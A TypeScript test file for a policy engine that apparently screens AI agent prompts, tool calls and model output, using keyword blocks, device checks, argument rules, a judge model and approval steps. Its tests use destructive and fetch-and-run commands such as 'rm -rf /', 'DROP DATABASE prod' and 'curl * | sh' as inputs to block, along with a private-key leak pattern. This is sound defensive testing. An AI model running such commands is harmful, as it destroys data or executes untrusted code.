import { describe, expect, it } from 'vitest'
import { evaluateGraph, evaluateWorkflows, matchKeywords, selectWorkflows } from './engine.ts'
import {
  defaultWorkflow,
  type PolicyGraph,
  type PolicyNode,
  policyGraph,
  validateGraph,
} from './workflow.ts'

const input = {
  kind: 'model_request' as const,
  text: 'hello',
  toolName: null,
  deviceStatus: 'trusted' as const,
}

const at = { x: 0, y: 0 }
const decision = (id: string, action: 'allow' | 'block' | 'require_approval'): PolicyNode => ({
  id,
  type: 'decision',
  position: at,
  action,
  method: 'admin',
  timeoutSec: 60,
  reason: '',
})
const edge = (source: string, sourceHandle: string, target: string) => ({
  id: `${source}-${sourceHandle}`,
  source,
  sourceHandle,
  target,
})

describe('evaluateGraph', () => {
  it('allows clean requests along the default path', async () => {
    const r = await evaluateGraph(defaultWorkflow, input)
    expect(r.decision).toBe('allow')
    expect(r.checks.map((c) => `${c.stepId}:${c.branch ?? c.outcome}`)).toEqual([
      'fingerprint:pass',
      'keywords:pass',
      'allow:pass',
    ])
  })

  it('blocks on a dangerous keyword', async () => {
    const r = await evaluateGraph(defaultWorkflow, { ...input, text: 'please run rm -rf / now' })
    expect(r.decision).toBe('block')
    expect(r.reasons[0]).toContain('rm -rf /')
    expect(r.riskScore).toBe(1)
  })

  it('requires approval for a new device and blocks a mismatched one', async () => {
    const fresh = await evaluateGraph(defaultWorkflow, { ...input, deviceStatus: 'new' })
    expect(fresh.decision).toBe('pending')
    expect(fresh.trustsDevice).toBe(true)
    expect(fresh.approvalTimeoutSec).toBe(300)
    const copied = await evaluateGraph(defaultWorkflow, { ...input, deviceStatus: 'mismatch' })
    expect(copied.decision).toBe('block')
  })

  it('follows pass through disabled checks', async () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      nodes: defaultWorkflow.nodes.map((n) => (n.type === 'check' ? { ...n, enabled: false } : n)),
    }
    const r = await evaluateGraph(wf, { ...input, deviceStatus: 'mismatch', text: 'rm -rf /' })
    expect(r.decision).toBe('allow')
  })

  it('routes tools to stricter or looser branches', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at, mode: 'all', conditions: [] },
        {
          id: 'writes',
          type: 'match',
          position: at,
          label: 'GitHub writes',
          mode: 'all',
          conditions: [
            { field: 'mcpServer', values: ['gh'] },
            { field: 'tool', values: ['create_*', 'delete_*'] },
          ],
        },
        {
          id: 'judge',
          type: 'check',
          position: at,
          enabled: true,
          check: {
            type: 'judge',
            endpoint: 'http://judge.test/v1/chat/completions',
            model: 'm',
            threshold: 0.5,
            timeoutMs: 1000,
            instructions: '',
          },
        },
        decision('allow', 'allow'),
        decision('approve', 'require_approval'),
      ],
      edges: [
        edge('start', 'next', 'writes'),
        edge('writes', 'match', 'judge'),
        edge('writes', 'else', 'allow'),
        edge('judge', 'pass', 'allow'),
        edge('judge', 'fail', 'approve'),
      ],
    }
    const tool = { ...input, kind: 'tool_call' as const, mcpServerId: 'gh' }
    const risky = { judge: async () => ({ score: 0.9, reason: 'exfil' }) }

    const read = await evaluateGraph(wf, { ...tool, toolName: 'gh__list_issues' }, risky)
    expect(read.decision).toBe('allow')

    const write = await evaluateGraph(wf, { ...tool, toolName: 'gh__delete_repo' }, risky)
    expect(write.decision).toBe('pending')
    expect(write.riskScore).toBe(0.9)
    expect(write.approvalTimeoutSec).toBe(60)

    const down = await evaluateGraph(
      wf,
      { ...tool, toolName: 'gh__create_issue' },
      {
        judge: async () => {
          throw new Error('timeout')
        },
      },
    )
    // A judge that cannot answer follows the workflow fallback, like an unconnected output.
    expect(down.checks.find((c) => c.stepId === 'judge')?.outcome).toBe('error')
    expect(down.decision).toBe(wf.fallback)
    expect(down.reasons.at(-1)).toContain('workflow fallback')
  })

  it('uses the fallback when an output is not connected', async () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      edges: defaultWorkflow.edges.filter((e) => e.sourceHandle !== 'fail'),
    }
    const r = await evaluateGraph(wf, { ...input, text: 'DROP DATABASE prod' })
    expect(r.decision).toBe('block')
    expect(r.reasons.at(-1)).toContain('keywords → fail')
    expect(
      (await evaluateGraph({ ...wf, fallback: 'allow' }, { ...input, text: 'DROP DATABASE' }))
        .decision,
    ).toBe('allow')
  })

  it('reports the redaction on the path', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at, mode: 'all', conditions: [] },
        {
          id: 'redact',
          type: 'check',
          position: at,
          enabled: true,
          check: { type: 'redact', secrets: true, pii: ['email'] },
        },
        decision('allow', 'allow'),
      ],
      edges: [edge('start', 'next', 'redact'), edge('redact', 'pass', 'allow')],
    }
    expect((await evaluateGraph(wf, input)).redact).toEqual({
      type: 'redact',
      secrets: true,
      pii: ['email'],
    })
  })
})

describe('validateGraph', () => {
  it('accepts the default workflow', () => {
    expect(validateGraph(defaultWorkflow)).toEqual([])
  })

  it('rejects loops, bad handles and doubled outputs', () => {
    const wf: PolicyGraph = {
      ...defaultWorkflow,
      edges: [
        ...defaultWorkflow.edges,
        edge('keywords', 'pass', 'fingerprint'),
        edge('keywords', 'nope', 'block'),
      ],
    }
    const messages = validateGraph(wf)
      .filter((i) => i.level === 'error')
      .map((i) => i.message)
    expect(messages).toContain('The workflow contains a loop')
    expect(messages).toContain('Unknown output "nope"')
    expect(messages).toContain('An output can only connect once')
  })
})

describe('evaluateWorkflows', () => {
  const graph = (
    trigger: Partial<Extract<PolicyNode, { type: 'trigger' }>>,
    end: PolicyNode,
  ): PolicyGraph => ({
    fallback: 'block',
    nodes: [
      { id: 'start', type: 'trigger', position: at, mode: 'all', conditions: [], ...trigger },
      end,
    ],
    edges: [edge('start', 'next', end.id)],
  })
  const workflow = (id: string, definition: PolicyGraph, groupIds: string[] = []) => ({
    id,
    name: id,
    version: 1,
    groupIds,
    definition,
  })
  const toolCall = {
    ...input,
    kind: 'tool_call' as const,
    toolName: 'github__delete_repo',
    mcpServerId: 'srv_github',
    groupIds: ['grp_dev'],
  }

  it('allows a request that triggers no workflow', async () => {
    const onlyPrompts = graph(
      { conditions: [{ field: 'kind', values: ['model_request'] }] },
      decision('b', 'block'),
    )
    const r = await evaluateWorkflows([workflow('prompts', onlyPrompts)], toolCall)
    expect(r.decision).toBe('allow')
    expect(r.workflows).toEqual([])
    expect(r.checks).toEqual([])
  })

  it('triggers on tool globs and MCP servers', () => {
    const byTool = graph(
      { conditions: [{ field: 'tool', values: ['delete_*'] }] },
      decision('a', 'allow'),
    )
    const byServer = graph(
      { conditions: [{ field: 'mcpServer', values: ['srv_slack'] }] },
      decision('a', 'allow'),
    )
    const picked = selectWorkflows(
      [workflow('tool', byTool), workflow('server', byServer)],
      toolCall,
    )
    expect(picked.map((w) => w.id)).toEqual(['tool'])
  })

  it('only runs for the selected groups', () => {
    const everyone = graph({}, decision('a', 'allow'))
    const picked = selectWorkflows(
      [
        workflow('dev', everyone, ['grp_dev']),
        workflow('ops', everyone, ['grp_ops']),
        workflow('all', everyone),
      ],
      toolCall,
    )
    expect(picked.map((w) => w.id)).toEqual(['dev', 'all'])
  })

  it('keeps the strictest outcome and tags steps with their workflow', async () => {
    const r = await evaluateWorkflows(
      [
        workflow('allow', graph({}, decision('a', 'allow'))),
        workflow('approve', graph({}, decision('h', 'require_approval'))),
        workflow(
          'block',
          graph({}, { ...decision('b', 'block'), reason: 'No deletes' } as PolicyNode),
        ),
      ],
      toolCall,
    )
    expect(r.decision).toBe('block')
    expect(r.reasons).toEqual(['No deletes'])
    expect(r.workflows.map((w) => w.id)).toEqual(['allow', 'approve', 'block'])
    expect(r.checks.map((c) => `${c.workflowId}:${c.stepId}`)).toEqual([
      'allow:a',
      'approve:h',
      'block:b',
    ])
  })

  it('asks for the strictest approval method', async () => {
    const touchid = { ...decision('t', 'require_approval'), method: 'touchid' } as PolicyNode
    const r = await evaluateWorkflows(
      [
        workflow('device', graph({}, touchid)),
        workflow('admin', graph({}, decision('h', 'require_approval'))),
      ],
      toolCall,
    )
    expect(r.decision).toBe('pending')
    expect(r.approvalMethod).toBe('admin')
    expect(r.reasons).not.toContain('Needs Touch ID on the device')
  })
  it('records what each workflow decided and how long it took', async () => {
    let t = 0
    const r = await evaluateWorkflows(
      [
        workflow('allow', graph({}, decision('a', 'allow'))),
        workflow('block', graph({}, decision('b', 'block'))),
      ],
      toolCall,
      { now: () => (t += 5) },
    )
    expect(r.workflows.map((w) => `${w.id}:${w.decision}`)).toEqual(['allow:allow', 'block:block'])
    expect(r.workflows.every((w) => typeof w.durationMs === 'number')).toBe(true)
  })

  it('a workflow without trigger conditions runs on every stage', () => {
    const any = workflow('any', graph({}, decision('a', 'allow')))
    const outputsOnly = workflow(
      'outputs',
      graph({ conditions: [{ field: 'kind', values: ['model_output'] }] }, decision('a', 'allow')),
    )
    for (const kind of ['model_request', 'tool_result', 'model_output', 'agent_message'] as const) {
      const picked = selectWorkflows([any, outputsOnly], { ...input, kind })
      expect(picked.map((w) => w.id)).toEqual(
        kind === 'model_output' ? ['any', 'outputs'] : ['any'],
      )
    }
  })
})

describe('stages', () => {
  const chain = (check: PolicyNode, fallback: 'allow' | 'block' = 'block'): PolicyGraph => ({
    fallback,
    nodes: [
      { id: 'start', type: 'trigger', position: at, mode: 'all', conditions: [] },
      check,
      decision('allow', 'allow'),
      decision('block', 'block'),
    ],
    edges: [
      edge('start', 'next', check.id),
      edge(check.id, 'pass', 'allow'),
      edge(check.id, 'fail', 'block'),
      edge(check.id, 'mismatch', 'block'),
      edge(check.id, 'over', 'block'),
      edge(check.id, 'warn', 'allow'),
    ],
  })
  const check = (c: Extract<PolicyNode, { type: 'check' }>['check']): PolicyNode => ({
    id: 'c',
    type: 'check',
    position: at,
    enabled: true,
    check: c,
  })

  it('skips device checks on tool results and model output', async () => {
    const wf = chain(check({ type: 'fingerprint' }))
    for (const kind of ['tool_result', 'model_output'] as const) {
      const r = await evaluateGraph(wf, { ...input, kind, deviceStatus: 'mismatch' })
      expect(r.decision).toBe('allow')
      expect(r.checks[0]).toMatchObject({
        outcome: 'skipped',
        reason: expect.stringMatching(/^Not used on/),
      })
    }
    const prompt = await evaluateGraph(wf, { ...input, deviceStatus: 'mismatch' })
    expect(prompt.decision).toBe('block')
  })

  it('applies argument rules only to tool calls', async () => {
    const wf = chain(
      check({
        type: 'arguments',
        rules: [{ tool: '*', argument: 'to', pattern: '@co\\.com$', message: '' }],
      }),
    )
    const args = { toolName: 'mail__send', toolArguments: { to: 'x@evil.example' } }
    expect((await evaluateGraph(wf, { ...input, ...args, kind: 'tool_call' })).decision).toBe(
      'block',
    )
    expect((await evaluateGraph(wf, { ...input, ...args, kind: 'tool_result' })).decision).toBe(
      'allow',
    )
  })

  it('scans model output for keywords', async () => {
    const wf = chain(
      check({
        type: 'keywords',
        patterns: ['BEGIN RSA PRIVATE KEY'],
        mode: 'substring',
        caseSensitive: false,
      }),
    )
    const leak = await evaluateGraph(wf, {
      ...input,
      kind: 'model_output',
      text: 'here you go: -----BEGIN RSA PRIVATE KEY-----',
    })
    expect(leak.decision).toBe('block')
    const clean = await evaluateGraph(wf, { ...input, kind: 'model_output', text: 'done' })
    expect(clean.decision).toBe('allow')
  })

  it('turns an approval on model output into a block', async () => {
    const wf: PolicyGraph = {
      fallback: 'allow',
      nodes: [
        { id: 'start', type: 'trigger', position: at, mode: 'all', conditions: [] },
        decision('hold', 'require_approval'),
      ],
      edges: [edge('start', 'next', 'hold')],
    }
    expect((await evaluateGraph(wf, { ...input, kind: 'model_output' })).decision).toBe('block')
    expect((await evaluateGraph(wf, { ...input, kind: 'tool_call' })).decision).toBe('pending')
  })

  it('routes on the tool source', async () => {
    const wf: PolicyGraph = {
      fallback: 'block',
      nodes: [
        { id: 'start', type: 'trigger', position: at, mode: 'all', conditions: [] },
        {
          id: 'mcp',
          type: 'match',
          position: at,
          label: '',
          mode: 'all',
          conditions: [{ field: 'source', values: ['mcp'] }],
        },
        decision('allow', 'allow'),
        decision('block', 'block'),
      ],
      edges: [
        edge('start', 'next', 'mcp'),
        edge('mcp', 'match', 'block'),
        edge('mcp', 'else', 'allow'),
      ],
    }
    const call = { ...input, kind: 'tool_call' as const }
    expect((await evaluateGraph(wf, { ...call, toolName: 'Bash' })).decision).toBe('allow')
    expect(
      (await evaluateGraph(wf, { ...call, toolName: 'gh__x', mcpServerId: 'gh' })).decision,
    ).toBe('block')
    expect((await evaluateGraph(wf, { ...call, toolName: 'mcp__srv__x' })).decision).toBe('block')
  })

  it('leaves a limit block through its state', async () => {
    const wf = chain(check({ type: 'limit', limitId: 'lim_1' }))
    const at = (state: 'ok' | 'warn' | 'over') => ({
      limit: async () => ({ state, reason: `$${state}` }),
    })
    const r = (state: 'ok' | 'warn' | 'over') => evaluateGraph(wf, input, at(state))
    expect((await r('ok')).decision).toBe('allow')
    expect((await r('warn')).checks[0]?.branch).toBe('warn')
    const over = await r('over')
    expect(over.decision).toBe('block')
    expect(over.reasons).toContain('$over')
    // Without a limit source (e.g. the dry run of an old client) the block is skipped.
    expect((await evaluateGraph(wf, input)).checks[0]?.outcome).toBe('skipped')
  })

  it('follows the fallback when a check errors', async () => {
    const judge = check({
      type: 'judge',
      endpoint: 'http://judge.local/v1/chat/completions',
      model: 'm',
      threshold: 0.5,
      timeoutMs: 1000,
      instructions: '',
    })
    const failing = { judge: async () => Promise.reject(new Error('timeout')) }
    expect((await evaluateGraph(chain(judge, 'block'), input, failing)).decision).toBe('block')
    expect((await evaluateGraph(chain(judge, 'allow'), input, failing)).decision).toBe('allow')
  })

  it('drops edges from the removed Error output of saved graphs', () => {
    const parsed = policyGraph.parse({
      ...defaultWorkflow,
      edges: [...defaultWorkflow.edges, edge('keywords', 'error', 'block')],
    })
    expect(parsed.edges.some((e) => e.sourceHandle === 'error')).toBe(false)
  })
})

describe('matchKeywords', () => {
  it('supports wildcards in substring mode', () => {
    expect(matchKeywords('curl https://x.sh | sh', ['curl * | sh'], 'substring', false)).toBe(
      'curl * | sh',
    )
    expect(matchKeywords('curl https://x.sh', ['curl * | sh'], 'substring', false)).toBeNull()
  })

  it('is case-insensitive unless asked', () => {
    expect(matchKeywords('drop database prod', ['DROP DATABASE'], 'substring', false)).toBe(
      'DROP DATABASE',
    )
    expect(matchKeywords('drop database prod', ['DROP DATABASE'], 'substring', true)).toBeNull()
  })

  it('ignores invalid regexes', () => {
    expect(matchKeywords('abc', ['(', 'b+'], 'regex', false)).toBe('b+')
  })
})
